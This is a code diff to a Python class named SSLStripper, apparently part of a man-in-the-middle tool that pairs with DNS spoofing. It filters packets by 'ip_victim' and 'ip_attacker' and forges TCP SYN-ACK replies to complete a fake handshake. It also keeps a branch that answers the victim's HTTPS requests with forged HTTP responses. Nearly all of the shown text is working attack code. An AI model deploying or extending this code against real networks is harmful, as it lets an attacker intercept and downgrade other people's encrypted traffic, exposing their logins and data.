@@ -21,13 +21,33 @@ class SSLStripper:
         log_warning("Stopping SSL stripping")
 
     def _on_https_request(self, packet):
-        # TODO: move these checks into sniff filter (also for DNS)
-        if (
-            # Ideally we would want to check that this is an HTTPS packet, but it is encrypted so we just assume that 443 is HTTPS
-            packet[IP].src == self.ip_victim
-            # Because we did the DNS spoofing, we should only strip if the destination IP is us (as in only then it is intended for the server)
-            and packet[IP].dst == self.ip_attacker
-        ):
+        # Completely ignore packets not coming from victim:
+        if packet[IP].src != self.ip_victim:
+            return
+
+        # Because we did the DNS spoofing, we should only strip if the destination IP is us (as in only then it is intended for the server)
+        if packet[IP].dst != self.ip_attacker:
+            log_warning("Ignoring packet from {} because it is not intended for us but for {}".format(packet[IP].src, packet[IP].dst))
+            return
+        
+        # Check if we have a SYN packet such that we can complete the handshake.
+        if packet[TCP].flags == 0x02:
+            log_info("Received SYN packet from {}".format(packet[IP].src))
+            # Construct the SYN-ACK packet
+            response = (
+                IP(dst=packet[IP].src, src=packet[IP].dst)
+                / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="SA", seq=packet[TCP].ack, ack=packet[TCP].seq + 1)
+            )
+
+            send(response, verbose=0)
+            log_info("Sent SYN-ACK packet to {}".format(packet[IP].src))
+
+        # Ignore ACK packets, as the handshake has completed.
+        elif packet[TCP].flags == 0x10:
+            log_info("Received ACK packet from {}".format(packet[IP].src))
+
+        # SSL stripping
+        else:
             log_info(
                 "Received HTTPS request for {} from {}".format(
                     packet[IP].dst, packet[IP].src
@@ -42,5 +62,3 @@ class SSLStripper:
 
             send(response, verbose=0)
             log_info("Sent HTTP response for {} to {}".format(packet[IP].src, packet[IP].dst))
-        else:
-            log_warning("Ignoring packet from {}".format(packet[IP].src))
